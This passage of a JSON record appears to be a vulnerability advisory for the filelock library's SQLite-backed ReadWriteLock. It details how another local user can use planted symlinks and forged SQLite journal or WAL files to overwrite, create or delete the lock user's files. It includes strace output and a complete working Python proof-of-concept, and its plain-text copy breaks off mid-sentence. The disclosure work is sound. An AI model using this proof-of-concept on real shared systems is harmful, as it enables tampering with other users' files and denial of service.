            {
              "deprecatedIds": [
                "CVE-2026-112940",
                "GHSA-v4x8-3wr5-3wq8"
              ],
              "fullDescription": {
                "markdown": "`ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) hand SQLite a name they do not control. On Linux the lock validates its database through a descriptor (the number the kernel gives a process for an open file). It then connects SQLite to `/proc/self/fd/\u003cn\u003e`, a Linux path that names the process's own open file `n`. SQLite turns that path back into a plain path and reopens it by name, following symlinks (a symlink is a file that points at another path). On every POSIX route SQLite also acts on `-journal`, `-wal` and `-shm` files it finds beside that name. Those are SQLite's side files: the rollback journal (pages saved to undo an interrupted write), the write-ahead log or WAL (changes kept outside the main file), and the shared-memory index for the WAL.\n\nAnother local user who can create or rename entries in the directory that holds the lock database can turn this against the user running the lock (below: the lock user). Such a directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). That other user can make the lock user's ordinary `read_lock()` or `write_lock()` write bytes of the other user's choosing into the lock user's own files. The same position lets the other user make that call create or unlink files of the lock user, admit a reader beside a writer, or kill the holder. All of this runs with the lock user's privileges. In a sticky directory such as `/tmp` a planted `-wal` file makes every acquire fail. Affected versions are filelock 3.20.4 through 4.2.0 (the `/proc/self/fd` redirect since 4.0.9, the side-file variants since 3.20.4).\n\nAnthropic's OSS Scanner reported this in private as `ANT-2026-KMJ2575J` [high, CWE-363]: ReadWriteLock: SQLite still follows planted symlinks, overwriting files.\n\n## Severity\n\n**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` scores 7.1 (High).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): the planted-journal variant needs no race, and the redirect won 77 of 77 attempts. `I:H` (high integrity impact): the other user writes bytes of their choosing into files of the lock user and unlinks files of their choosing. `A:H` (high availability impact): the other user makes every acquire fail or kills the lock holder. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.\n\nClassification from the external review: **conditional security**, a cross-user effect that exists only when another user can change names in the lock database's directory. The review notes that the 77/77 inotify result (inotify is a Linux interface that reports file events) is stronger evidence than a theoretical TOCTOU (a time-of-check to time-of-use race). The scanner rated it high. The review accepts the mechanism and narrows it to that precondition.\n\n## Scope and preconditions\n\n- The other party is a different local account that can create or rename entries in the directory that holds the lock database. That is a `0777` directory or a group-writable one (including a setgid `2775` project directory shared with that account), in each case without the sticky bit. The lock user's lock must be able to open the database read-write, so a database the other user creates is `0666`. filelock itself creates the database `0600`.\n- Sticky directories (`/tmp`, `/var/tmp`, any `1777` directory) narrow the finding rather than exclude it. The redirect and the journal replay do not reach a database the lock user owns there (tested with `fs.protected_regular=2`). What remains is a planted non-empty `\u003cdb\u003e-wal` (any mode; a directory or FIFO works too) that the lock user cannot unlink. It makes every acquire raise `sqlite3.OperationalError: disk I/O error`. A hard link (a second name for the same file) to a file of the lock user at the lock path also remains, if `fs.protected_hardlinks=0`.\n- Two kernel settings matter. `fs.protected_regular` (1 or 2 is the systemd default on most distributions; the kernel's own default is 0) keeps a user from opening a file another user owns in a sticky world-writable directory. Where it is 0, the other user can own the database in `/tmp`, and SQLite follows a planted symlink itself (not tested). `fs.protected_hardlinks=1` (most distributions; kernel default 0) blocks a hard link of a lock user's file onto the lock path. Neither setting affects a non-sticky shared directory.\n- Platform and route. The `/proc/self/fd` redirect is Linux with `/proc` mounted, 4.0.9 and later. The side-file variants (`-journal`, `-wal`, `-shm`) exist on every POSIX route. On the hard-link route (macOS since 4.1.1 for every connection, Linux without `/proc`) they need the link-directory swap described under \"Mechanism\", so a non-sticky parent. Neither the scanner nor the review executed on macOS; the statement rests on the platform branch and the identical code after it. Windows does not take this path.\n- Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename an entry in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.\n\n## Affected code\n\nAt the scanned commit `b831496b0273`: [`_connect_through_descriptor` builds `/proc/self/fd/\u003cn\u003e` and hands it to `sqlite3.connect`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L982-L1001). The assumption is the [comment at line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), \"Descriptor paths reopen the validated inode\" (an inode is the kernel's identity for a file, independent of its name). SQLite first reads the file it opened at [`PRAGMA journal_mode=MEMORY`, line 816](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L816). The check in [`_raise_if_database_replaced` at line 836](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L836) runs only after `BEGIN`. Both [`_open_lock_database`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1079-L1091) and [`_raise_if_wal`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1094-L1101) inspect the descriptor, not the file SQLite is on. The one-level hard link of the macOS route is [`_link_beside`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1014-L1029).\n\n## Introduced\n\nThe `/proc/self/fd` redirect came with `4d45e83` (\"Merge commit from fork\", the fix for GHSA-j8f7-rjxc-mr56), first released in **4.0.9** (verified: `git tag --contains 4d45e83` gives 4.0.9); 4.0.8 does not have it. The side-file variants are older. They reproduce on `cfd4446` (\"feat(lock): add SQLite-based ReadWriteLock (#399)\"), first released in **3.20.4** (verified), which passed the lock path straight to `sqlite3.connect`.\n\n## Mechanism\n\nOn Linux the lock opens the database with `O_RDWR|O_CREAT|O_NOFOLLOW|O_NONBLOCK`. It checks through the descriptor that the file is a regular file and not a WAL database. It then calls `sqlite3.connect(\"/proc/self/fd/\u003cn\u003e\")` and expects SQLite to reopen the validated inode. SQLite does not open that name. It runs `readlink()` on it, which yields the path string the kernel reports for the descriptor at that moment, and opens that string by path, following every symlink. Without interference the trace shows `readlink(\"/proc/534/fd/3\") = \"/tmp/benign/app.lock.db\"` and then a second `openat` of that path. The descriptor contributes only a string. Once the directory entry behind the descriptor is gone, the string is `\u003cdatabase\u003e (deleted)`. A symlink with that exact name sends SQLite wherever its creator chose.\n\nThe other user prepares the directory before the lock user runs. They create a database `cache.lock.db` (`0666`, so the lock user's lock accepts it) with a second hard link `cache.lock.db.keep`, and the symlink `cache.lock.db (deleted) -\u003e /tmp/victim-notes.txt`. The lock user's `os.open` raises an inotify `IN_OPEN` event. The other user unlinks `cache.lock.db` and links `cache.lock.db.keep` back under the same name. The lock user's descriptor still refers to the unlinked entry, so `/proc/self/fd/3` now reads `/tmp/shared-cache/cache.lock.db (deleted)`. `sqlite3.connect` resolves it, follows the symlink and opens the target `O_RDWR|O_CREAT`. None of filelock's checks look at that file. `_open_lock_database` and `_raise_if_wal` inspect descriptor 3. `_raise_if_database_replaced` compares an `lstat` of the lock path with the descriptor's `(st_dev, st_ino)`, which passes because the other user linked the same inode back, and it runs only after `BEGIN`.\n\nThe damage comes from the first statement, `PRAGMA journal_mode=MEMORY`. SQLite finds `\u003ctarget\u003e-journal`, treats it as the rollback journal of an interrupted transaction, and copies its page records into the target before it checks whether the target is a database at all. The journal header supplies the page size and the page count SQLite resizes the file to. Whoever wrote the journal computed the per-page checksum. The content from offset 0 and the final length are therefore the other user's. Strace of the lock user's process (SQLite 3.40.1):\n\n```\nopenat(\"/tmp/shared-cache/cache.lock.db\", O_RDWR|O_CREAT|O_NONBLOCK|O_NOFOLLOW|O_CLOEXEC, 0600) = 3\nreadlink(\"/proc/3819/fd/3\", \"/tmp/shared-cache/cache.lock.db (deleted)\", 4096) = 41\nreadlink(\"/tmp/shared-cache/cache.lock.db (deleted)\", \"/tmp/victim-notes.txt\", 4096) = 21\nopenat(\"/tmp/victim-notes.txt\", O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC, 0644) = 4\nopenat(\"/tmp/victim-notes.txt-journal\", O_RDWR|O_NOFOLLOW|O_CLOEXEC) = 5\npread64(5, \"ATTACKER CONTENT WRITTEN BY THE \"..., 4096, 516) = 4096\npwrite64(4, \"ATTACKER CONTENT WRITTEN BY THE \"..., 4096, 0) = 4096\nunlink(\"/tmp/victim-notes.txt-journal\") = -1 EPERM            -\u003e \"disk I/O error\"\n```\n\nThe redirect itself needs no journal. The constructor's validation connection already makes SQLite open the target with `O_CREAT`. With the symlink pointing at a missing path in the lock user's home, constructing the lock created that file (empty, `0644`, owned by the lock user) and raised nothing. With the symlink pointing at a `0600` WAL-mode SQLite database of the lock user, `write_lock()` returned without error and the database's header bytes 18 and 19 changed from `2 2` to `1 1`. The pragma converted the lock user's database out of WAL mode, and the redirected acquire held its SQLite lock on that database rather than on the lock database.\n\n**Side-file names beside the database.** Two comments record the belief that SQLite names its side files after the descriptor path ([line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), [line 1095](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L1095)). The path is not synthetic to SQLite. It derives `\u003cdatabase\u003e-journal`, `\u003cdatabase\u003e-wal` and `\u003cdatabase\u003e-shm` from the resolved real path in the shared directory. `journal_mode=MEMORY` governs only journals SQLite would write, not ones it finds. These variants need no redirect.\n\n*A hot `-journal` makes the lock user unlink a file the journal names; no race.* The other user unlinks the lock user's empty `lock.db`, puts a one-page SQLite database (`0666`) in its place, and writes a 46-byte `lock.db-journal`: a path, its 4-byte length, the 4-byte sum of its bytes and SQLite's journal magic. SQLite treats a journal beside a non-empty database as hot (left by an interrupted transaction). The tail names a \"super-journal\", and recovery ends by unlinking that file. The lock user's next `read_lock()` or `write_lock()` returns without error and the named file is gone (`unlink(\"/home/victim/private/notes.txt\") = 0`, from a `0700` directory of the lock user). The named file must be a non-empty regular file the lock user can read and unlink. A FIFO planted as `lock.db-journal` instead blocks `read_lock(timeout=2)` in SQLite's `open()` of the journal (still blocked when killed after 10 s).\n\n*A re-planted `-wal` puts the holder in WAL mode past `_raise_if_wal`.* `_raise_if_wal` checks header bytes 18 and 19. Whenever a connection takes its first lock, SQLite stats `\u003cdb\u003e-wal`, and if that file and the database are both non-empty it opens the WAL whatever the header says. The pragma at line 816 converts such a database and unlinks `-wal` and `-shm`. The `BEGIN` at line 833 is a separate statement that starts unlocked and stats `\u003cdb\u003e-wal` again. Re-creating the 32-byte `-wal` in that gap landed on the first attempt in 20 of 20 runs on a 2-CPU machine.\n\nThe lock user's `with lock.write_lock():` then holds the `-shm` byte-120 WAL write lock and only SHARED on the database. Once the other user removes the `-wal`, a second process of the lock user gets `read_lock(timeout=1)` granted while the writer is inside its block, with no exception on either side. SQLite also creates `\u003cdb\u003e-shm` with the database's permission bits (`0666`) and keeps it mapped into memory. After the other user truncates it, the writer dies with `SIGBUS` (the signal for touching a mapped file region that no longer exists) in `connection.rollback()` during `release()`.\n\n*A `-wal` in a sticky directory makes every acquire raise; no race, no access to the database.* Beside the lock user's own empty `0600` database, a non-empty `\u003cdb\u003e-wal` (one byte, any mode; a directory or FIFO works too) is a leftover SQLite tries to delete. In a `1777` directory the lock user cannot unlink another user's file (`unlink(...) = -1 EPERM`), so the pragma fails with `SQLITE_IOERR_DELETE`. The code in [`_do_acquire_inner`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L763) translates only \"database is locked\" into `Timeout`. `sqlite3.OperationalError: disk I/O error` therefore leaves every `acquire_read()` / `acquire_write()` (and the async variants) within milliseconds, whatever `timeout` or `blocking` says, until the file's owner or root removes it.\n\n*Further effects observed at this commit in a non-sticky directory.* A `0755` script owned by the lock user, renamed to the lock path with a one-record journal beside it, ends up holding the other user's bytes (the acquire raises `file is not a database`). A hard link to the lock user's `0600` `~/.profile` at the lock path does the same in a sticky `/tmp` when `fs.protected_hardlinks=0`. When the locking process runs as root, SQLite runs `fchown` on a `-wal` or `-shm` it opens to match the owner of the database, so root's `0600` `service.env` renamed to `app.lock.db-wal` belonged to the other user after root's `read_lock()`.\n\nA journal whose super-journal names the database itself makes SQLite open and close a second descriptor on the database, which drops the process's POSIX locks, so `acquire_read` returns with no lock held in `/proc/locks` and a writer in another process acquires (two journals in a row, one per statement; write locks are not affected). A one-byte `lock.db-wal` plus a `lock.db-shm` on which the other user holds two byte locks makes the acquire take 10 s regardless of `timeout` and raise `locking protocol`, or die with `SIGBUS` if the other user truncates the `-shm`.\n\n**The hard-link route in a directory without the sticky bit.** None of the above occurs on the `_link_beside` branch (macOS, Linux without `/proc`). There SQLite's main file is `.filelock-…/lock.db` in the connecting user's `0700` directory. That protection holds only where no other user can rename the `.filelock-*` entry itself, because `0700` protects the contents, not the entry in the parent. `_link_beside` checks the link once and returns a pathname, and every later use is by that name.\n\nWith `/proc` hidden in a `0777` directory, the other user staged a directory holding a hard link `lock.db` to a one-page database and a hot `lock.db-journal`. They held `BEGIN EXCLUSIVE` on the database so the lock user's first statement waited in the busy handler (SQLite's retry loop for a locked database), renamed the lock user's `.filelock-*` directory aside, renamed the staged directory onto its name and rolled back. SQLite got SHARED, found the journal under the swapped name and unlinked the file it named. The lock user's process reported the lock held and exited 0. A polling variant without the write lock also won (in 40 trials the file was gone after 1 to 26 starts of the lock user's program). Under the sticky bit the rename fails with `EPERM`.\n\n## Reproduction\n\nThe scanner's reproducer for `ANT-2026-KMJ2575J`, quoted as received. It ran against commit `b831496b0273`.\n\n**`repro`**\n\n```python\n#!/usr/bin/env python3\nimport os\nimport shutil\nimport subprocess\nimport sys\n\nas_victim = {\"user\": \"victim\", \"group\": \"victim\", \"extra_groups\": []}\nas_attacker = {\"user\": \"attacker\", \"group\": \"attacker\", \"extra_groups\": []}\n\n# set up: the lock database lives in a shared cache directory, 0777 and not sticky\nshared_dir = \"/tmp/shared-cache\"\nlock_db = shared_dir + \"/cache.lock.db\"\nshutil.rmtree(shared_dir, ignore_errors=True)\nos.mkdir(shared_dir)\nos.chmod(shared_dir, 0o777)\n\n# set up: a private 0600 file of the victim's in sticky /tmp, which the attacker cannot write\ntarget = \"/tmp/victim-notes.txt\"\nfor leftover in (target, target + \"-journal\"):\n    if os.path.lexists(leftover):\n        os.unlink(leftover)\noriginal = b\"original victim notes\\n\"\nwith open(target, \"wb\") as notes:\n    notes.write(original)\nshutil.chown(target, \"victim\", \"victim\")\nos.chmod(target, 0o600)\ndirect_write = subprocess.run(\n    [sys.executable, \"-c\", \"import sys; open(sys.argv[1], 'r+b')\", target], capture_output=True, text=True, **as_attacker\n)\nprint(\"attacker opening the target for writing:\", direct_write.stderr.strip().splitlines()[-1])\nassert direct_write.returncode != 0\n\n# attack: a hot journal beside the target, and a redirect of the victim's SQLite from the lock database to the target\ncontent = \"ATTACKER CONTENT WRITTEN BY THE VICTIM'S ReadWriteLock\\n\"\nsubprocess.run([sys.executable, \"/tmp/repro.d/plant_hot_journal.py\", target, content], check=True, **as_attacker)\nredirect = subprocess.Popen(\n    [sys.executable, \"/tmp/repro.d/redirect_lock_db.py\", lock_db, target], stdout=subprocess.PIPE, text=True, **as_attacker\n)\nassert redirect.stdout.readline() == \"ready\\n\"\n\n# the victim takes its read lock; the attacker races each acquire, so the victim runs up to 20 times\nfor run in range(1, 21):\n    victim = subprocess.run(\n        [sys.executable, \"/tmp/repro.d/victim_app.py\", lock_db], capture_output=True, text=True, timeout=60, **as_victim\n    )\n    with open(target, \"rb\") as notes:\n        after = notes.read()\n    if after != original:\n        break\nredirect.kill()\nredirect.wait()\n\n# check: taking a lock on cache.lock.db must leave the victim's notes alone\nprint(f\"victim run {run}: exit status {victim.returncode}:\", (victim.stderr.strip() or \"no error\").splitlines()[-1])\nstatus = os.stat(target)\nprint(\"target owner, mode, size:\", status.st_uid, oct(status.st_mode \u0026 0o7777), status.st_size)\nprint(\"target before:\", original)\nprint(\"target after: \", after[:60])\nprint(\"BUG\" if after == content.encode().ljust(4096, b\"\\0\") else \"OK\")\n```\n\n**`repro.d/plant_hot_journal.py`**\n\n```python\n#!/usr/bin/env python3\n\"\"\"The attacker: leave a rollback journal beside TARGET whose one record restores TARGET's first page to CONTENT.\"\"\"\n\nimport os\nimport struct\nimport sys\n\ntarget, content = sys.argv[1], sys.argv[2].encode()\njournal_path = target + \"-journal\"\n\n# https://www.sqlite.org/fileformat2.html#the_rollback_journal\nJOURNAL_MAGIC = bytes.fromhex(\"d9d505f920a163d7\")\npage_size, sector_size, nonce = 4096, 512, 0x11223344\nrecord_count = 1\npages_after_rollback = 1  # SQLite truncates TARGET to this many pages\nheader = JOURNAL_MAGIC + struct.pack(\"\u003eIIIII\", record_count, nonce, pages_after_rollback, sector_size, page_size)\n\npage_number = 1  # page 1 starts at offset 0\npage_image = content.ljust(page_size, b\"\\0\")\n# SQLite's pager_cksum(): the nonce plus every 200th byte, counting down from page_size - 200\nchecksum = (nonce + sum(page_image[i] for i in range(page_size - 200, 0, -200))) \u0026 0xFFFFFFFF\nrecord = struct.pack(\"\u003eI\", page_number) + page_image + struct.pack(\"\u003eI\", checksum)\n\nwith open(journal_path, \"wb\") as journal:\n    journal.write(header.ljust(sector_size, b\"\\0\") + record)\nos.chmod(journal_path, 0o666)  # the victim's SQLite opens a hot journal O_RDWR\n```\n\n**`repro.d/redirect_lock_db.py`**\n\n```python\n#!/usr/bin/env python3\n\"\"\"The attacker: make the victim's SQLite, connecting through /proc/self/fd/\u003cn\u003e, open TARGET instead of LOCK_DB.\"\"\"\n\nimport ctypes\nimport os\nimport sys\n\nlock_db, target = sys.argv[1], sys.argv[2]\nspare_name = lock_db + \".keep\"\n\n# the attacker creates the lock database, world-writable so that the victim's ReadWriteLock accepts it\nos.close(os.open(lock_db, os.O_CREAT | os.O_WRONLY))\nos.chmod(lock_db, 0o666)\nos.link(lock_db, spare_name)\n\n# what /proc/\u003cpid\u003e/fd/\u003cn\u003e reads back as once the name the descriptor was opened through is unlinked\nos.symlink(target, lock_db + \" (deleted)\")\n\nIN_OPEN = 0x20\nlibc = ctypes.CDLL(None, use_errno=True)\ninotify = libc.inotify_init1(0)\nif libc.inotify_add_watch(inotify, lock_db.encode(), IN_OPEN) \u003c 0:\n    raise OSError(ctypes.get_errno(), \"inotify_add_watch\", lock_db)\nprint(\"ready\", flush=True)\n\nwhile True:\n    os.read(inotify, 4096)  # the victim's ReadWriteLock has opened the database and is validating its descriptor\n    os.unlink(lock_db)\n    os.link(spare_name, lock_db)  # the same inode back at the path, so filelock's later lstat sees no change\n```\n\n**`repro.d/victim_app.py`**\n\n```python\n#!/usr/bin/env python3\n\"\"\"The victim: an application that takes its shared read lock once, as in docs/how-to.rst.\"\"\"\n\nimport sys\n\nfrom filelock import ReadWriteLock\n\nrw = ReadWriteLock(sys.argv[1])\nwith rw.read_lock(timeout=5):\n    pass\n```\n\n## Attack sequence\n\nThe redirect, with `A` the other local user:\n\n```mermaid\nsequenceDiagram\n    participant A as other local user\n    participant V as lock user's process (filelock)\n    participant S as SQLite inside that process\n    participant K as kernel and filesystem\n    rect rgb(255, 214, 214)\n        Note over A,K: filelock 4.0.9 to 4.2.0 on Linux, lock directory 0777 without the sticky bit\n        A-\u003e\u003eK: create cache.lock.db (0666) and a second hard link cache.lock.db.keep\n        A-\u003e\u003eK: symlink \"cache.lock.db (deleted)\" pointing at /tmp/victim-notes.txt\n        A-\u003e\u003eK: write /tmp/victim-notes.txt-journal (hot rollback journal, one page record)\n        V-\u003e\u003eK: open(cache.lock.db, O_RDWR O_CREAT O_NOFOLLOW) gives fd 3, fstat says regular, header not WAL\n        K--\u003e\u003eA: inotify IN_OPEN on cache.lock.db\n        A-\u003e\u003eK: unlink(cache.lock.db) then link(cache.lock.db.keep, cache.lock.db)\n        V-\u003e\u003eS: sqlite3.connect(\"/proc/self/fd/3\")\n        S-\u003e\u003eK: readlink(/proc/self/fd/3) returns \"cache.lock.db (deleted)\"\n        S-\u003e\u003eK: open(\"cache.lock.db (deleted)\") follows the symlink to victim-notes.txt\n        V-\u003e\u003eS: PRAGMA journal_mode=MEMORY\n        S-\u003e\u003eK: open(victim-notes.txt-journal), pread page 1, pwrite it at offset 0 of victim-notes.txt\n        Note over V,K: victim-notes.txt (0600, 22 bytes) is now the other user's 4096-byte page image, the lock user sees \"disk I/O error\"\n        V-\u003e\u003eK: lstat(cache.lock.db) matches fd 3 identity, so _raise_if_database_replaced passes\n    end\n```\n\nThe side-file variants, which need no redirect:\n\n```mermaid\nflowchart TD\n    B0[\"acquire validates fd, connects SQLite by a name in the shared directory\"] --\u003e B1{\"what did the other user put beside the real path?\"}\n    B1 -- \"hot -journal beside a swapped-in one-page database\" --\u003e B2[\"PRAGMA replays the journal, then unlinks the super-journal file it names, acquire succeeds\"]\n    B1 -- \"-wal re-created between PRAGMA and BEGIN\" --\u003e B3[\"holder in WAL mode, reader admitted beside the writer, SIGBUS when -shm is truncated\"]\n    B1 -- \"-wal in a sticky directory the lock user cannot unlink\" --\u003e B4[\"every acquire raises OperationalError disk I/O error, timeout ignored\"]\n    B1 -- \"name unlinked and a (deleted) symlink planted\" --\u003e B5[\"SQLite opens the symlink target with O_CREAT\"]\n    classDef ok fill:#d8f3dc,stroke:#2d6a4f,color:#1b4332;\n    classDef bad fill:#ffd6d6,stroke:#c1121f,color:#5c0000;\n    classDef info fill:#cfe4ff,stroke:#1f6feb,color:#0b1f3a;\n    class B0,B1 info;\n    class B2,B3,B4,B5 bad;\n```\n\n## Evidence\n\nThe scanner's reproducer runs the documented `ReadWriteLock(path)` + `with rw.read_lock(timeout=5):` as user `victim` against `/tmp/shared-cache/cache.lock.db` (directory `0777`, not sticky) while user `attacker` holds the symlink and reacts to inotify. It first shows that `attacker` cannot write the target (`PermissionError: [Errno 13] Permission denied: '/tmp/victim-notes.txt'`). On the first `victim` run it prints `victim run 1: exit status 1: sqlite3.OperationalError: disk I/O error`, `target owner, mode, size: 1000 0o600 4096`, target before `b'original victim notes\\n'`, after `b\"ATTACKER CONTENT WRITTEN BY THE VICTIM'S ReadWriteLock\\n\\x00...\"`, verdict `BUG`. Reacting to inotify redirected the first acquire in 77 of 77 runs. A plain unlink/link busy loop with no inotify also won on the first run. A process holding two `ReadWriteLock` instances on one database keeps an idle descriptor; a swap done a full second before the second acquire redirected it. The `-wal` re-plant landed on the first attempt in 20 of 20 runs. The journal-unlink variant needs no race.\n\nOur verification: the reproducer prints `BUG` on the scanned commit `b831496` and on the 4.2.0 image (`e2e7d70`). On the PR #834 head it prints `OK`: all 20 `victim` runs exit 0 with no error and the target stays `1000 0o600 22` bytes with its original content. The independent review also ran the sticky-directory `-wal` variant (a `0600` database owned by `victim` in a `1777` directory, other user plants `\u003cdb\u003e-wal`). 4.2.0 raises `OperationalError: disk I/O error`; the PR head takes read and write locks with the file still present.\n\n## Impact\n\nAnother local user who can write the non-sticky directory holding the database makes the lock user's process act on a file other than the lock database, with the lock user's privileges, on Linux. The process writes bytes of the other user's choosing from offset 0 into any non-empty regular file the lock user can write, resized to a whole number of pages, provided the other user can create `\u003cfile\u003e-journal` beside it (the lock user's own `0600` files in `/tmp` qualify). Without a journal the process creates an empty file at any path it may create, or converts a WAL-mode SQLite database of its own to rollback mode with no error. A journal beside a swapped-in database makes the process unlink one regular file of the other user's choosing per journal; the acquire succeeds and raises nothing. A process inside `write_lock()` stops excluding the lock user's other processes from `read_lock()`, and the holder can die from a `SIGBUS` that arrives in `release()`.\n\nIt is **not** reachable for a database the lock user owns in `/tmp` with `fs.protected_regular` 1 or 2. There only the planted `-wal` denial of service remains: every acquire raises an undocumented `sqlite3.OperationalError` that `Timeout` and `OSError` handlers do not catch. It is a bypass of the fix for GHSA-j8f7-rjxc-mr56 (4.0.9), which refused the symlink at the database path but followed it at `\u003cdatabase\u003e (deleted)`. Windows does not take this path.\n\n## Workarounds\n\n- Keep the `ReadWriteLock` database in a directory that only the locking account (or root) can write, with no group or other write bit. Make sure every ancestor belongs to that account or root and is either not writable by others or sticky. Do not share one `ReadWriteLock` database between accounts through a `0777` or group-writable directory. The lock creates its database `0600`, and leaving it that way keeps other accounts from supplying its content.\n- For a lock in a sticky directory keep `fs.protected_regular` at 1 or 2 and `fs.protected_hardlinks=1` (distribution defaults). Treat a sudden `sqlite3.OperationalError: disk I/O error` on every acquire as a foreign `\u003cdb\u003e-wal` beside the database that the file's owner or root has to remove.\n\n## Patched version\n\n4.2.1.\n\nFix: https://github.com/tox-dev/filelock/pull/834\n\n## Credits\n\nReported by Anthropic's OSS Scanner (automated analysis), 15 October 2026; reviewed by the maintainers.\n\n- 2026-10-15 23:08 UTC: report received (scan `filelock-20261015-005` of commit `b831496b0273`)\n- 2026-10-16 00:46 UTC: draft advisory created\n- 2026-10-16 01:15 UTC: fix PR #834 opened",
                "text": "`ReadWriteLock` and `AsyncReadWriteLock` (the SQLite-backed reader/writer lock) hand SQLite a name they do not control. On Linux the lock validates its database through a descriptor (the number the kernel gives a process for an open file). It then connects SQLite to `/proc/self/fd/\u003cn\u003e`, a Linux path that names the process's own open file `n`. SQLite turns that path back into a plain path and reopens it by name, following symlinks (a symlink is a file that points at another path). On every POSIX route SQLite also acts on `-journal`, `-wal` and `-shm` files it finds beside that name. Those are SQLite's side files: the rollback journal (pages saved to undo an interrupted write), the write-ahead log or WAL (changes kept outside the main file), and the shared-memory index for the WAL.\n\nAnother local user who can create or rename entries in the directory that holds the lock database can turn this against the user running the lock (below: the lock user). Such a directory is a `0777` or group-writable cache, build or project directory without the sticky bit (a directory flag that lets only a file's owner remove or rename it). That other user can make the lock user's ordinary `read_lock()` or `write_lock()` write bytes of the other user's choosing into the lock user's own files. The same position lets the other user make that call create or unlink files of the lock user, admit a reader beside a writer, or kill the holder. All of this runs with the lock user's privileges. In a sticky directory such as `/tmp` a planted `-wal` file makes every acquire fail. Affected versions are filelock 3.20.4 through 4.2.0 (the `/proc/self/fd` redirect since 4.0.9, the side-file variants since 3.20.4).\n\nAnthropic's OSS Scanner reported this in private as `ANT-2026-KMJ2575J` [high, CWE-363]: ReadWriteLock: SQLite still follows planted symlinks, overwriting files.\n\n## Severity\n\n**CVSS 3.1 `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` scores 7.1 (High).** `AV:L` (local): the other user needs an account on the same host. `PR:L` (low privileges): an ordinary account is enough. `UI:N` (no user interaction). `AC:L` (low attack complexity): the planted-journal variant needs no race, and the redirect won 77 of 77 attempts. `I:H` (high integrity impact): the other user writes bytes of their choosing into files of the lock user and unlinks files of their choosing. `A:H` (high availability impact): the other user makes every acquire fail or kills the lock holder. `C:N` (no confidentiality impact): the other user learns nothing. `S:U` (scope unchanged): the effect stays within the lock user's own privileges.\n\nClassification from the external review: **conditional security**, a cross-user effect that exists only when another user can change names in the lock database's directory. The review notes that the 77/77 inotify result (inotify is a Linux interface that reports file events) is stronger evidence than a theoretical TOCTOU (a time-of-check to time-of-use race). The scanner rated it high. The review accepts the mechanism and narrows it to that precondition.\n\n## Scope and preconditions\n\n- The other party is a different local account that can create or rename entries in the directory that holds the lock database. That is a `0777` directory or a group-writable one (including a setgid `2775` project directory shared with that account), in each case without the sticky bit. The lock user's lock must be able to open the database read-write, so a database the other user creates is `0666`. filelock itself creates the database `0600`.\n- Sticky directories (`/tmp`, `/var/tmp`, any `1777` directory) narrow the finding rather than exclude it. The redirect and the journal replay do not reach a database the lock user owns there (tested with `fs.protected_regular=2`). What remains is a planted non-empty `\u003cdb\u003e-wal` (any mode; a directory or FIFO works too) that the lock user cannot unlink. It makes every acquire raise `sqlite3.OperationalError: disk I/O error`. A hard link (a second name for the same file) to a file of the lock user at the lock path also remains, if `fs.protected_hardlinks=0`.\n- Two kernel settings matter. `fs.protected_regular` (1 or 2 is the systemd default on most distributions; the kernel's own default is 0) keeps a user from opening a file another user owns in a sticky world-writable directory. Where it is 0, the other user can own the database in `/tmp`, and SQLite follows a planted symlink itself (not tested). `fs.protected_hardlinks=1` (most distributions; kernel default 0) blocks a hard link of a lock user's file onto the lock path. Neither setting affects a non-sticky shared directory.\n- Platform and route. The `/proc/self/fd` redirect is Linux with `/proc` mounted, 4.0.9 and later. The side-file variants (`-journal`, `-wal`, `-shm`) exist on every POSIX route. On the hard-link route (macOS since 4.1.1 for every connection, Linux without `/proc`) they need the link-directory swap described under \"Mechanism\", so a non-sticky parent. Neither the scanner nor the review executed on macOS; the statement rests on the platform branch and the identical code after it. Windows does not take this path.\n- Ancestor boundary. Protection against another local user is possible only while no other user can replace the lock's directory or any of its ancestors. That holds when each ancestor belongs to the user or root and is either not writable by others or sticky. A user who can rename an entry in a non-sticky directory above the lock controls every name below it. No file-based lock can defend against that.\n\n## Affected code\n\nAt the scanned commit `b831496b0273`: [`_connect_through_descriptor` builds `/proc/self/fd/\u003cn\u003e` and hands it to `sqlite3.connect`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L982-L1001). The assumption is the [comment at line 63](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_read_write.py#L63), \"Descriptor paths reopen the validated inode\" (an inode is the kernel's identity for a file, independent of its name). SQLite first reads the file it opened at [`PRAGMA journal_mode=MEMORY`, line 